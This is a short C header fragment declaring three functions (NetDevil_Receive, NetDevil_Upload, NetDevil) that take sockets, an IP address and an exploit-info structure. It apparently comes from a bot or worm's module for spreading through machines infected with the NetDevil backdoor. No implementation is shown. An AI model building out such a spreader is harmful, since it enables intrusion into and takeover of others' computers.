#ifndef NO_NETDEVIL
int NetDevil_Receive(SOCKET ssock);
int NetDevil_Upload(char *IP, SOCKET ssock);
BOOL NetDevil(EXINFO exinfo);
#endif